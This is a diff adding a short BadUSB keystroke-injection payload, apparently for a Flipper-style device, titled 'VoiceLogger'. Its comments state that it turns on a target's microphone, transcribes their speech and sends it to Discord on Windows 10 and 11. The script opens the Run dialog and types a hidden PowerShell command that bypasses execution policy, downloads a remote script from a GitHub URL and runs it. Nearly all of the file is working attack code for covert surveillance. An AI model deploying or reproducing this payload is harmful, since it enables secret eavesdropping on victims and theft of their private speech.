@@ -1,0 +1,12 @@
+REM     Title: VoiceLogger
+
+REM     Author: I am J
+
+REM     This payload activates your targets microphone and converts their speech to text and exfils it to discord
+
+REM     Target: Windows 10, 11
+
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -Ep Bypass $dc='';irm https://github.com/MovinjMatt/Support-Flipper-USB/blob/main/Payloads/VoiceLogger/VL.ps1 | iex
+ENTER
